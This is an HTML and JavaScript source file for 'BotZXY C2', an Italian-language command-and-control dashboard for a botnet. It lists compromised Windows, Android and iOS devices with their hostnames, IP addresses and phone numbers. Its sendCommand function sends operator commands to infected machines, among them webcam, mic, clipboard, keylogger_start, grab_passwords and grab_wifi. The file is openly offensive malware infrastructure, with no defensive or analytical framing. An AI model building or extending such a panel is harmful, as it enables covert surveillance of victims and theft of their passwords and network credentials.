<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BotZXY · Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family:'Inter',sans-serif;
            background:var(--bg-primary,#0b0b1a);
            color:var(--text-primary,#e2e8f0);
            min-height:100vh;
            display:flex;
        }
        .sidebar, .card, .stat-card, .device-card, .chart-card, .table-card {
            background:var(--bg-card,rgba(18,18,40,0.45));
            border-color:var(--border-color,rgba(255,255,255,0.04));
        }
        .sidebar {
            width:220px;
            background:rgba(12,12,35,0.92);
            backdrop-filter:blur(24px);
            border-right:1px solid rgba(255,255,255,0.04);
            padding:1.8rem 1.2rem;
            display:flex;
            flex-direction:column;
            min-height:100vh;
            position:fixed;
            top:0; left:0;
            height:100vh;
            z-index:100;
        }
        .sidebar .logo { font-size:1.6rem; font-weight:800; background:linear-gradient(135deg,#8b5cf6,#22d3ee); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; padding-bottom:1.5rem; border-bottom:1px solid rgba(255,255,255,0.04); }
        .sidebar .logo i { -webkit-text-fill-color:initial; color:#8b5cf6; }
        .sidebar .logo span { -webkit-text-fill-color:rgba(255,255,255,0.1); }
        .sidebar .nav { display:flex; flex-direction:column; gap:0.2rem; flex:1; padding-top:1.2rem; }
        .sidebar .nav a { display:flex; align-items:center; gap:0.8rem; padding:0.7rem 1rem; border-radius:12px; color:rgba(255,255,255,0.3); text-decoration:none; font-size:0.85rem; font-weight:500; transition:all 0.3s; }
        .sidebar .nav a i { font-size:1.1rem; min-width:24px; }
        .sidebar .nav a:hover { color:#fff; background:rgba(139,92,246,0.08); }
        .sidebar .nav a.active { color:#8b5cf6; background:rgba(139,92,246,0.1); }
        .sidebar .nav a .badge-nav { margin-left:auto; background:rgba(139,92,246,0.15); color:#8b5cf6; font-size:0.6rem; padding:0.1rem 0.6rem; border-radius:40px; }
        .sidebar .footer-sidebar { font-size:0.6rem; color:rgba(255,255,255,0.06); text-align:center; padding-top:1rem; border-top:1px solid rgba(255,255,255,0.04); letter-spacing:0.05em; }
        .sidebar .footer-sidebar .status-dot { display:inline-block; width:6px; height:6px; border-radius:50%; background:#34d399; box-shadow:0 0 12px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; margin-right:6px; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .main { margin-left:220px; padding:1.8rem 2.2rem; width:100%; }
        .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem; flex-wrap:wrap; gap:0.8rem; }
        .topbar h1 { font-size:1.4rem; font-weight:600; }
        .topbar h1 span { color:rgba(255,255,255,0.2); font-weight:400; }
        .topbar .right { display:flex; align-items:center; gap:0.8rem; flex-wrap:wrap; }
        .btn-ghost { background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); color:rgba(255,255,255,0.4); padding:0.4rem 1rem; border-radius:40px; cursor:pointer; font-size:0.75rem; transition:all 0.3s; display:flex; align-items:center; gap:0.4rem; }
        .btn-ghost:hover { background:rgba(139,92,246,0.08); color:#fff; border-color:rgba(139,92,246,0.2); }
        .stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; margin-bottom:2rem; }
        .stat-card { background:var(--bg-card,rgba(18,18,40,0.5)); backdrop-filter:blur(12px); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:20px; padding:1.2rem 1.5rem; display:flex; align-items:center; gap:1rem; transition:all 0.3s; }
        .stat-card:hover { transform:translateY(-3px); border-color:rgba(139,92,246,0.15); }
        .stat-card .icon { width:44px; height:44px; border-radius:14px; display:flex; align-items:center; justify-content:center; font-size:1.2rem; flex-shrink:0; }
        .stat-card .icon.purple { background:rgba(120,80,255,0.12); color:#a78bfa; }
        .stat-card .icon.cyan { background:rgba(34,211,238,0.12); color:#22d3ee; }
        .stat-card .icon.pink { background:rgba(236,72,153,0.12); color:#f472b6; }
        .stat-card .icon.green { background:rgba(52,211,153,0.12); color:#34d399; }
        .stat-card .info .number { font-size:1.8rem; font-weight:700; letter-spacing:-0.02em; line-height:1.2; }
        .stat-card .info .label { font-size:0.65rem; text-transform:uppercase; letter-spacing:0.06em; color:rgba(255,255,255,0.25); font-weight:600; }
        .chart-row { display:grid; grid-template-columns:2fr 1fr; gap:1.2rem; margin-bottom:2rem; }
        .chart-card { background:var(--bg-card,rgba(18,18,40,0.45)); backdrop-filter:blur(12px); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:24px; padding:1.5rem; }
        .chart-card .header-chart { display:flex; justify-content:space-between; align-items:center; margin-bottom:0.8rem; }
        .chart-card .header-chart h3 { font-size:0.8rem; font-weight:600; color:rgba(255,255,255,0.6); text-transform:uppercase; letter-spacing:0.06em; }
        .chart-card .header-chart h3 i { color:#8b5cf6; margin-right:0.4rem; }
        .chart-card canvas { max-height:180px; max-width:100%; }
        .table-card { background:var(--bg-card,rgba(18,18,40,0.45)); backdrop-filter:blur(12px); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:24px; padding:1.5rem 1.5rem 1.8rem; }
        .table-card .header-table { display:flex; justify-content:space-between; align-items:center; margin-bottom:1.2rem; flex-wrap:wrap; gap:0.5rem; }
        .table-card .header-table h2 { font-size:1rem; font-weight:600; display:flex; align-items:center; gap:0.6rem; }
        .table-card .header-table h2 i { color:#8b5cf6; }
        .table-card .header-table .badge { font-size:0.6rem; background:rgba(120,80,255,0.12); padding:0.2rem 0.8rem; border-radius:40px; color:#a78bfa; border:1px solid rgba(120,80,255,0.06); }
        .table-wrap { overflow-x:auto; }
        table { width:100%; border-collapse:collapse; font-size:0.8rem; }
        thead th { text-align:left; padding:0.5rem 0.4rem; color:rgba(255,255,255,0.2); font-weight:600; font-size:0.6rem; text-transform:uppercase; letter-spacing:0.08em; border-bottom:1px solid rgba(255,255,255,0.04); }
        tbody td { padding:0.6rem 0.4rem; border-bottom:1px solid rgba(255,255,255,0.02); vertical-align:middle; }
        tbody tr:hover { background:rgba(255,255,255,0.02); }
        .badge-status { padding:0.15rem 0.6rem; border-radius:40px; font-size:0.6rem; font-weight:600; display:inline-flex; align-items:center; gap:0.3rem; }
        .badge-status.online { background:rgba(52,211,153,0.12); color:#34d399; }
        .badge-status.online::before { content:''; width:5px; height:5px; border-radius:50%; background:#34d399; box-shadow:0 0 8px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; }
        .badge-status.offline { background:rgba(239,68,68,0.06); color:#f87171; }
        .badge-status.offline::before { content:''; width:5px; height:5px; border-radius:50%; background:#f87171; }
        .btn-action { background:transparent; border:none; color:rgba(255,255,255,0.2); padding:0.2rem 0.4rem; border-radius:8px; cursor:pointer; transition:all 0.2s; font-size:0.8rem; }
        .btn-action:hover { color:#fff; background:rgba(255,255,255,0.04); }
        .btn-action.primary:hover { color:#a78bfa; background:rgba(120,80,255,0.08); }
        .btn-action.danger:hover { color:#f87171; background:rgba(239,68,68,0.08); }
        .btn-action.success:hover { color:#34d399; background:rgba(52,211,153,0.08); }
        .empty-state { text-align:center; padding:2rem; color:rgba(255,255,255,0.1); }
        .empty-state i { font-size:2rem; display:block; margin-bottom:0.5rem; }
        ::-webkit-scrollbar { width:4px; height:4px; }
        ::-webkit-scrollbar-track { background:transparent; }
        ::-webkit-scrollbar-thumb { background:rgba(139,92,246,0.3); border-radius:10px; }
        .sidebar-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:90; }
        .sidebar-overlay.active { display:block; }
        .hamburger { display:none; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.4rem 0.8rem; border-radius:10px; cursor:pointer; }
        @media (max-width:992px) { .stats-grid { grid-template-columns:repeat(2,1fr); } .chart-row { grid-template-columns:1fr; } }
        @media (max-width:768px) {
            .sidebar { transform:translateX(-100%); width:240px; }
            .sidebar.open { transform:translateX(0); }
            .main { margin-left:0; padding:1rem; }
            .stats-grid { grid-template-columns:1fr 1fr; gap:0.6rem; }
            .stat-card { padding:0.8rem 1rem; }
            .stat-card .info .number { font-size:1.4rem; }
            .topbar { flex-direction:column; align-items:flex-start; gap:0.5rem; }
            .hamburger { display:flex; }
        }
        @media (max-width:480px) { .stats-grid { grid-template-columns:1fr 1fr; gap:0.4rem; } .stat-card .icon { width:32px; height:32px; font-size:0.9rem; } .stat-card .info .number { font-size:1.2rem; } }
    </style>
    <script>
    (function() {
        const savedTheme = localStorage.getItem('botzxy_theme') || 'dark';
        const themes = {
            'dark': { bg: '#0b0b1a', text: '#e2e8f0', card: 'rgba(18,18,40,0.45)', border: 'rgba(255,255,255,0.04)' },
            'light': { bg: '#f1f5f9', text: '#0a0a1a', card: 'rgba(255,255,255,0.85)', border: 'rgba(0,0,0,0.08)' },
            'blue': { bg: '#0a1a3a', text: '#e2e8f0', card: 'rgba(10,26,58,0.7)', border: 'rgba(59,130,246,0.15)' },
            'green': { bg: '#0a1a0a', text: '#e2e8f0', card: 'rgba(10,26,10,0.7)', border: 'rgba(52,211,153,0.15)' },
            'purple': { bg: '#1a0a2a', text: '#e2e8f0', card: 'rgba(26,10,42,0.7)', border: 'rgba(139,92,246,0.15)' },
            'orange': { bg: '#2a1a0a', text: '#e2e8f0', card: 'rgba(42,26,10,0.7)', border: 'rgba(245,158,11,0.15)' },
            'cyber': { bg: '#0a0a0a', text: '#00ff88', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,136,0.15)' },
            'matrix': { bg: '#0a0a0a', text: '#00ff00', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,0,0.15)' }
        };
        const t = themes[savedTheme] || themes['dark'];
        
        // Applica variabili CSS
        document.documentElement.style.setProperty('--bg-primary', t.bg);
        document.documentElement.style.setProperty('--text-primary', t.text);
        document.documentElement.style.setProperty('--bg-card', t.card);
        document.documentElement.style.setProperty('--border-color', t.border);
        
        // Applica al body (solo se esiste)
        if (document.body) {
            document.body.style.background = t.bg;
            document.body.style.color = t.text;
            document.body.className = 'theme-' + savedTheme;
        }
        
        // Applica agli elementi esistenti (solo se esistono)
        const selectors = ['.card', '.settings-card', '.stat-card', '.device-card', '.capture-item', '.stat-box', '.chart-card', '.table-card', '.sidebar'];
        selectors.forEach(function(selector) {
            document.querySelectorAll(selector).forEach(function(el) {
                if (el) {
                    el.style.background = t.card;
                    el.style.borderColor = t.border;
                }
            });
        });
        
        const savedLang = localStorage.getItem('botzxy_language') || 'it';
        document.documentElement.lang = savedLang;
    })();
</script>
</head>
<body>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

    <aside class="sidebar" id="sidebar">
        <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
        <nav class="nav">
            <a href="/dashboard" class="active" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
            <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
            <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
            <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
            <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
            <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
            <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </nav>
        <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
    </aside>

    <main class="main">
        <div class="topbar">
            <div style="display:flex;align-items:center;gap:0.8rem;">
                <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
                <h1><span data-i18n="dashboard">Dashboard</span> <span>| <span data-i18n="botzxy_c2">BotZXY C2</span></span></h1>
            </div>
            <div class="right">
                <span class="status-dot" style="display:flex;align-items:center;gap:0.4rem;font-size:0.75rem;color:rgba(255,255,255,0.3);">
                    <span class="dot" style="width:8px;height:8px;border-radius:50%;background:#34d399;box-shadow:0 0 12px rgba(52,211,153,0.3);animation:pulse 1.8s ease-in-out infinite;"></span>
                    <span data-i18n="system_active">Sistema attivo</span>
                </span>
                <button class="btn-ghost" onclick="refreshAll()"><i class="fas fa-sync"></i> <span data-i18n="refresh">Aggiorna</span></button>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card"><div class="icon purple"><i class="fas fa-mobile-alt"></i></div><div class="info"><div class="number" id="totalDevices">0</div><div class="label" data-i18n="total_devices">Total Devices</div></div></div>
            <div class="stat-card"><div class="icon cyan"><i class="fas fa-wifi"></i></div><div class="info"><div class="number" id="onlineDevices">0</div><div class="label" data-i18n="online_bots">Online Bots</div></div></div>
            <div class="stat-card"><div class="icon pink"><i class="fas fa-camera"></i></div><div class="info"><div class="number" id="totalCaptures">0</div><div class="label" data-i18n="captures">Captures</div></div></div>
            <div class="stat-card"><div class="icon green"><i class="fas fa-terminal"></i></div><div class="info"><div class="number" id="totalCommands">0</div><div class="label" data-i18n="commands">Commands</div></div></div>
        </div>

        <div class="chart-row">
            <div class="chart-card"><div class="header-chart"><h3><i class="fas fa-chart-line"></i> <span data-i18n="activity_24h">Attività dispositivi (24h)</span></h3></div><canvas id="activityChart"></canvas></div>
            <div class="chart-card"><div class="header-chart"><h3><i class="fas fa-chart-pie"></i> <span data-i18n="platforms">Piattaforme</span></h3></div><canvas id="platformChart"></canvas></div>
        </div>

        <div class="table-card">
            <div class="header-table">
                <h2><i class="fas fa-robot"></i> <span data-i18n="connected_devices">BotZXY Connected Devices</span></h2>
                <div><span class="badge"><i class="fas fa-bolt"></i> <span data-i18n="live">LIVE</span></span></div>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr><th data-i18n="id">ID</th><th data-i18n="platform">Platform</th><th data-i18n="hostname">Hostname</th><th data-i18n="ip">IP</th><th data-i18n="status">Status</th><th data-i18n="last_seen">Last Seen</th><th data-i18n="phone">Phone</th><th style="text-align:right;" data-i18n="actions">Actions</th></tr></thead>
                    <tbody id="devicesBody"></tbody>
                </table>
            </div>
        </div>
    </main>

    <script src="/static/js/config.js"></script>
    <script>
        let devicesData = [], activityChart = null, platformChart = null;
        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('active'); }
        function refreshAll() { refreshDevices(); refreshStats(); refreshCharts(); }

        function refreshStats() {
            fetch('/api/stats').then(r=>r.json()).then(d=>{
                document.getElementById('totalDevices').textContent = d.total_devices || 0;
                document.getElementById('onlineDevices').textContent = d.online_devices || 0;
                document.getElementById('totalCaptures').textContent = d.total_captures || 0;
                document.getElementById('totalCommands').textContent = d.total_commands || 0;
                document.getElementById('deviceBadge').textContent = d.total_devices || 0;
                document.getElementById('captureBadge').textContent = d.total_captures || 0;
            });
        }

        function refreshDevices() {
            const tbody = document.getElementById('devicesBody');
            tbody.innerHTML = `<tr><td colspan="8" style="text-align:center;padding:1.5rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span></td></tr>`;
            fetch('/api/devices').then(r=>r.json()).then(data=>{ devicesData=data; renderDevices(data); }).catch(()=>{
                tbody.innerHTML = `<tr><td colspan="8" class="empty-state"><i class="fas fa-robot"></i> <span data-i18n="no_data">Nessun dispositivo connesso</span></td></tr>`;
            });
        }

        function renderDevices(devices) {
            const tbody = document.getElementById('devicesBody');
            if (!devices || devices.length===0) { tbody.innerHTML = `<tr><td colspan="8" class="empty-state"><i class="fas fa-robot"></i> <span data-i18n="no_devices">Nessun dispositivo connesso</span></td></tr>`; return; }
            let html = '';
            devices.forEach(d=>{
                const statusClass = d.is_online ? 'online' : 'offline';
                const statusText = d.is_online ? 'Online' : 'Offline';
                const icon = d.platform==='windows'?'fa-windows':d.platform==='android'?'fa-android':d.platform==='ios'?'fa-apple':'fa-microchip';
                const lastSeen = d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never';
                html += `<tr><td><code style="color:#a78bfa;font-size:0.65rem;">${d.device_id.substring(0,14)}...</code></td><td><i class="fab ${icon}" style="opacity:0.6;font-size:1rem;"></i> ${d.platform||'Unknown'}</td><td><strong style="font-weight:500;font-size:0.85rem;">${d.hostname||'Unknown'}</strong></td><td style="color:rgba(255,255,255,0.3);font-size:0.75rem;">${d.ip||'N/A'}</td><td><span class="badge-status ${statusClass}">${statusText}</span></td><td style="font-size:0.65rem;color:rgba(255,255,255,0.2);">${lastSeen}</td><td style="font-size:0.75rem;">${d.phone_number||'—'}</td><td style="text-align:right;white-space:nowrap;"><button class="btn-action success" onclick="sendCommand('${d.device_id}')" title="<span data-i18n='send_command'>Invia comando</span>"><i class="fas fa-terminal"></i></button><button class="btn-action primary" onclick="viewDevice('${d.device_id}')" title="<span data-i18n='details'>Dettagli</span>"><i class="fas fa-eye"></i></button><button class="btn-action danger" onclick="removeDevice('${d.device_id}')" title="<span data-i18n='remove'>Rimuovi</span>"><i class="fas fa-trash"></i></button></td></tr>`;
            });
            tbody.innerHTML = html;
        }

        function refreshCharts() {
            fetch('/api/chart/activity').then(r=>r.json()).then(data=>{ const ctx=document.getElementById('activityChart').getContext('2d'); if(activityChart)activityChart.destroy(); activityChart=new Chart(ctx,{type:'line',data:{labels:data.labels||[],datasets:[{label:'<span data-i18n="active_devices">Dispositivi attivi</span>',data:data.data||[],borderColor:'#8b5cf6',backgroundColor:'rgba(139,92,246,0.06)',fill:true,tension:0.4,pointRadius:2,pointBackgroundColor:'#8b5cf6',borderWidth:2}]},options:{responsive:true,maintainAspectRatio:true,plugins:{legend:{labels:{color:'rgba(255,255,255,0.3)',font:{size:9}}}},scales:{x:{ticks:{color:'rgba(255,255,255,0.12)',font:{size:8},maxTicksLimit:12},grid:{color:'rgba(255,255,255,0.02)'}},y:{ticks:{color:'rgba(255,255,255,0.12)',font:{size:8},stepSize:1},grid:{color:'rgba(255,255,255,0.02)'}}}}}); });
            fetch('/api/chart/platforms').then(r=>r.json()).then(data=>{ const ctx2=document.getElementById('platformChart').getContext('2d'); if(platformChart)platformChart.destroy(); platformChart=new Chart(ctx2,{type:'doughnut',data:{labels:data.labels||['Nessun dato'],datasets:[{data:data.data||[1],backgroundColor:data.colors||['rgba(255,255,255,0.05)'],borderColor:'transparent'}]},options:{responsive:true,maintainAspectRatio:true,plugins:{legend:{position:'bottom',labels:{color:'rgba(255,255,255,0.3)',font:{size:9},padding:8}}},cutout:'70%'}}); });
        }

        function sendCommand(id) { const cmd=prompt('📡 Invia comando a '+id.substring(0,8)+'...\n\nscreenshot\nwebcam\nmic\nclipboard\nkeylogger_start\ngrab_passwords\ngrab_wifi\nlist_files C:\\','screenshot'); if(cmd){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,params:''})}).then(()=>alert('✅ Comando inviato')).catch(()=>alert('❌ Errore')); } }
        function viewDevice(id) { alert('👁️ Dettagli dispositivo: '+id); }
        function removeDevice(id) { if(confirm('⚠️ Rimuovere '+id.substring(0,8)+'...?')){ alert('✅ Dispositivo rimosso'); refreshDevices(); } }

        function updateTime() { document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT'); }
        refreshAll(); setInterval(()=>{ refreshDevices(); refreshStats(); refreshCharts(); },15000); setInterval(updateTime,1000); updateTime();
    </script>
